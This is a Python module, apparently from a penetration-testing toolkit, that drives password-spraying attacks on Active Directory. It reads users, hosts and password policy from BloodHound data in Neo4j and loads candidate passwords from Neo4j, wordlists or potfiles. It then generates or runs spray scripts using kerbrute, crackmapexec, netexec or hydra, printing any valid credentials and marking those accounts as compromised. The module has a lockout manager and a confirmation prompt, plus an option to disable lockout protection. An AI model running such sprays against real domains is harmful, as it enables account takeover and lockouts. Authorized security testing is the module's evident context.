"""
BloodTrail Spray Commands

Handles password spraying commands:
- --spray: Show password spray recommendations
- --spray-tailored: Generate tailored spray commands based on BloodHound access
- --auto-spray: Generate or execute spray operations
"""

import os
from argparse import Namespace
from pathlib import Path
from typing import List, Optional

from ..base import BaseCommandGroup
from ...config import Neo4jConfig
from ...pwned_tracker import PwnedTracker


class SprayCommands(BaseCommandGroup):
    """Password spray command handlers."""

    @classmethod
    def add_arguments(cls, parser) -> None:
        """Add spray arguments."""
        pass  # Arguments defined in cli/parser.py

    @classmethod
    def handle(cls, args: Namespace) -> int:
        """
        Handle spray commands.

        Returns:
            0 for success, non-zero for error, -1 if not handled
        """
        if getattr(args, 'spray', False):
            return cls._handle_spray(args)

        if getattr(args, 'spray_tailored', False):
            return cls._handle_spray_tailored(args)

        if getattr(args, 'auto_spray', False):
            return cls._handle_auto_spray(args)

        return -1

    @classmethod
    def _handle_spray(cls, args: Namespace) -> int:
        """Handle --spray command - show password spray recommendations."""
        from ...display import print_spray_recommendations

        config = Neo4jConfig(uri=args.uri, user=args.user, password=getattr(args, "neo4j_password", None) or os.environ.get("NEO4J_PASSWORD", ""))
        tracker = PwnedTracker(config)

        if not tracker.connect():
            cls.print_error("Could not connect to Neo4j")
            return 1

        try:
            # Get pwned users with credentials
            pwned_users = tracker.list_pwned_users()

            # Get password policy if stored
            policy = tracker.get_password_policy()

            # Get domain config
            domain_config = tracker.get_domain_config()
            domain = domain_config.get("domain", "") if domain_config else ""
            dc_ip = (domain_config.get("dc_ip") if domain_config else None) or "<DC_IP>"

            # Get all machine IPs for multi-target loops
            machines = tracker.get_all_machines_with_ips()
            all_ips = [m["ip"] for m in machines if m.get("ip")]

            # Show recommendations
            print_spray_recommendations(
                pwned_users=pwned_users,
                policy=policy,
                domain=domain,
                dc_ip=dc_ip,
                method_filter=getattr(args, 'spray_method', 'all'),
                all_ips=all_ips,
            )

            return 0

        finally:
            tracker.close()

    @classmethod
    def _handle_spray_tailored(cls, args: Namespace) -> int:
        """Handle --spray-tailored command - generate tailored spray commands."""
        from ...display import print_spray_tailored

        config = Neo4jConfig(uri=args.uri, user=args.user, password=getattr(args, "neo4j_password", None) or os.environ.get("NEO4J_PASSWORD", ""))
        tracker = PwnedTracker(config)

        if not tracker.connect():
            cls.print_error("Could not connect to Neo4j")
            return 1

        try:
            # Get all user-to-machine access relationships
            access_data = tracker.get_all_users_with_access()

            if not access_data:
                cls.print_error("No user-to-machine access relationships found in Neo4j")
                print("    Make sure BloodHound data has been imported with edge collection")
                return 1

            # Get domain config
            domain_config = tracker.get_domain_config()
            domain = domain_config.get("domain", "") if domain_config else ""

            # Generate output
            console_output, markdown_output = print_spray_tailored(
                access_data=access_data,
                domain=domain,
                use_colors=True,
            )

            # Print to console (no truncation)
            print(console_output)

            # Write report file
            output_file = getattr(args, 'spray_tailored_output', None) or "spray_tailored.md"
            try:
                with open(output_file, "w") as f:
                    f.write(markdown_output)
                cls.print_success(f"Report written to: {output_file}")
            except Exception as e:
                cls.print_error(f"Failed to write report: {e}")

            return 0

        finally:
            tracker.close()

    @classmethod
    def _handle_auto_spray(cls, args: Namespace) -> int:
        """Handle --auto-spray command - generate or execute spray operations."""
        from ...autospray import (
            SprayExecutor,
            CredentialManager,
            LockoutManager,
            ScriptGenerator,
            Neo4jCredentialSource,
            WordlistSource,
            PotfileSource,
            TargetManager,
            Neo4jUserSource,
            Neo4jMachineSource,
            FileTargetSource,
        )
        from ...autospray.executor import SprayTool, ToolNotFoundError

        config = Neo4jConfig(uri=args.uri, user=args.user, password=getattr(args, "neo4j_password", None) or os.environ.get("NEO4J_PASSWORD", ""))
        tracker = PwnedTracker(config)

        if not tracker.connect():
            cls.print_error("Could not connect to Neo4j")
            return 1

        try:
            # Get domain configuration
            domain_config = tracker.get_domain_config()
            domain = domain_config.get("domain", "") if domain_config else ""
            dc_ip = domain_config.get("dc_ip") if domain_config else None

            if not dc_ip:
                cls.print_error("DC IP not configured. Set it with: crack bt --dc-ip <IP>")
                return 1

            if not domain:
                cls.print_error("Domain not configured. Set it with: crack bt --domain <DOMAIN>")
                return 1

            cls.print_info(f"Domain: {domain}")
            cls.print_info(f"DC IP: {dc_ip}")
            print()

            # Initialize credential manager
            cred_manager = CredentialManager()

            # Add requested credential sources (default: neo4j)
            sources = getattr(args, 'cred_source', None) or ["neo4j"]

            if "neo4j" in sources:
                cred_manager.add_source(Neo4jCredentialSource(config))
            if "wordlist" in sources:
                if not getattr(args, 'wordlist', None):
                    cls.print_error("--wordlist required when using --cred-source wordlist")
                    return 1
                cred_manager.add_source(WordlistSource(args.wordlist))
            if "potfile" in sources:
                cred_manager.add_source(PotfileSource(getattr(args, 'potfile', None)))

            # Get passwords (optional - commands will use placeholders if empty)
            passwords = cred_manager.get_passwords_for_spray()

            if passwords:
                cls.print_success(f"Loaded {len(passwords)} passwords from {len(sources)} source(s)")
            else:
                cls.print_info("No passwords found - commands will use <PASSWORD> placeholders")
                stats = cred_manager.get_statistics()
                print(f"    Sources checked: {stats['sources_available'] or ['none']}")

            # Initialize target manager
            target_manager = TargetManager()

            # Add user sources
            user_filter = getattr(args, 'spray_users', 'enabled')
            if user_filter == "custom" and getattr(args, 'user_file', None):
                target_manager.add_user_source(FileTargetSource(args.user_file, "user"))
            else:
                target_manager.add_user_source(Neo4jUserSource(config, user_filter))

            # Add machine sources
            if getattr(args, 'targets_file', None):
                target_manager.add_machine_source(FileTargetSource(args.targets_file, "machine"))
            else:
                target_manager.add_machine_source(Neo4jMachineSource(config))

            # Get targets
            users = target_manager.get_users()
            machines = target_manager.get_machines()

            if not users:
                cls.print_error("No target users found")
                return 1

            cls.print_success(f"Targeting {len(users)} users")
            if machines:
                cls.print_success(f"Targeting {len(machines)} machines")
            print()

            # Get password policy
            policy = tracker.get_password_policy()

            # Initialize lockout manager
            lockout_mgr = LockoutManager(
                policy=policy,
                override_mode=getattr(args, 'no_lockout_protection', False),
            )

            # Display spray plan (only if we have passwords)
            if passwords:
                print(lockout_mgr.format_plan_display(passwords, len(users)))
                print()

            # Determine tool
            spray_tool = None
            spray_tool_arg = getattr(args, 'spray_tool', None)
            if spray_tool_arg and spray_tool_arg != "auto":
                tool_map = {
                    "kerbrute": SprayTool.KERBRUTE,
                    "crackmapexec": SprayTool.CRACKMAPEXEC,
                    "netexec": SprayTool.NETEXEC,
                    "hydra": SprayTool.HYDRA,
                }
                spray_tool = tool_map.get(spray_tool_arg)

            if getattr(args, 'execute', False):
                # Execute mode - run spray with real-time output
                return cls._execute_auto_spray(
                    args, tracker, domain, dc_ip, users, passwords,
                    lockout_mgr, spray_tool, machines
                )
            else:
                # Default: Generate scripts for review
                return cls._generate_spray_scripts(
                    args, domain, dc_ip, users, passwords, lockout_mgr, machines
                )

        finally:
            tracker.close()

    @classmethod
    def _execute_auto_spray(
        cls,
        args: Namespace,
        tracker: PwnedTracker,
        domain: str,
        dc_ip: str,
        users: List[str],
        passwords: List[str],
        lockout_mgr,
        spray_tool,
        machines: Optional[List[str]] = None
    ) -> int:
        """Execute spray with real-time output."""
        from ...autospray import SprayExecutor
        from ...autospray.executor import ToolNotFoundError

        machines = machines or []

        # Confirmation prompt
        print("=" * 60)
        print("  AUTO-SPRAY EXECUTION CONFIRMATION")
        print("=" * 60)
        print()
        print(f"  Target Users:     {len(users)} accounts")
        print(f"  Target Machines:  {len(machines)} hosts" if machines else "  Target Machines:  DC only")
        print(f"  Passwords:        {len(passwords)} unique passwords")
        print(f"  DC Target:        {dc_ip}")
        print()

        if lockout_mgr.has_policy:
            print(f"  Lockout threshold: {lockout_mgr.lockout_threshold} attempts")
            print(f"  Safe per round:    {lockout_mgr.safe_attempts}")
        elif getattr(args, 'no_lockout_protection', False):
            print("  WARNING: Lockout protection DISABLED")
        else:
            print("  WARNING: No lockout policy detected")

        print()
        confirm = input("  Type 'SPRAY' to confirm: ")

        if confirm != "SPRAY":
            cls.print_error("Aborted")
            return 1

        print()
        cls.print_info("Starting spray...")
        print()

        try:
            with SprayExecutor(
                tool=spray_tool,
                domain=domain,
                dc_ip=dc_ip,
                verbose=True,
            ) as executor:
                tool_name = executor.get_tool().value
                cls.print_info(f"Using tool: {tool_name}")
                print()

                all_results = []

                def progress_cb(current, total, status):
                    print(f"\r[{current}/{total}] {status}    ", end="", flush=True)

                def result_cb(result):
                    if result.success:
                        for r in result.results:
                            admin = " [ADMIN]" if r.is_admin else ""
                            print(f"\n[+] VALID: {r.username}:{r.password}{admin}")

                results = executor.spray_with_plan(
                    users=users,
                    passwords=passwords,
                    lockout_manager=lockout_mgr,
                    progress_callback=progress_cb,
                    result_callback=result_cb,
                )

                all_results.extend(results)

            # Summary
            print()
            print()
            print("=" * 60)
            print("  SPRAY COMPLETE")
            print("=" * 60)
            print()

            valid_creds = [r for result in all_results for r in result.results]
            admin_creds = [r for r in valid_creds if r.is_admin]

            print(f"  Valid credentials: {len(valid_creds)}")
            print(f"  Admin access:      {len(admin_creds)}")
            print()

            if valid_creds:
                print("  Credentials found:")
                for r in valid_creds:
                    admin = " (ADMIN)" if r.is_admin else ""
                    print(f"    {r.username}:{r.password}{admin}")
                print()

                # Mark pwned in Neo4j
                cls.print_info("Marking users as pwned in Neo4j...")
                marked = tracker.mark_pwned_batch([
                    {"username": r.username, "password": r.password, "is_admin": r.is_admin}
                    for r in valid_creds
                ])
                cls.print_success(f"Marked {marked} users as pwned")

            return 0

        except ToolNotFoundError as e:
            cls.print_error(str(e))
            return 1
        except Exception as e:
            cls.print_error(f"Spray failed: {e}")
            return 1

    @classmethod
    def _generate_spray_scripts(
        cls,
        args: Namespace,
        domain: str,
        dc_ip: str,
        users: List[str],
        passwords: List[str],
        lockout_mgr,
        machines: Optional[List[str]] = None
    ) -> int:
        """Generate spray scripts for manual review."""
        from ...autospray import ScriptGenerator

        machines = machines or []
        output_dir = Path(getattr(args, 'spray_output', None) or "./spray_output")
        spray_tool_arg = getattr(args, 'spray_tool', None)
        tool = spray_tool_arg if spray_tool_arg != "auto" else "crackmapexec"

        generator = ScriptGenerator(
            domain=domain,
            dc_ip=dc_ip,
            output_dir=output_dir,
            tool=tool,
        )

        cls.print_info(f"Generating spray scripts with {tool}...")

        generator.generate_spray_script(
            users=users,
            passwords=passwords,
            lockout_manager=lockout_mgr,
            machines=machines,
        )

        # Print the commands file content to console
        commands_file = output_dir / "spray_commands.txt"
        if commands_file.exists():
            print()
            print(commands_file.read_text())

        # Show file locations
        print()
        cls.print_success(f"Files saved to: {output_dir}/")
        print(f"    users.txt      - {len(users)} target users")
        if machines:
            print(f"    targets.txt    - {len(machines)} target machines")
        if passwords:
            print(f"    passwords.txt  - {len(passwords)} passwords")
            print(f"    spray.sh       - Executable spray script")

        return 0
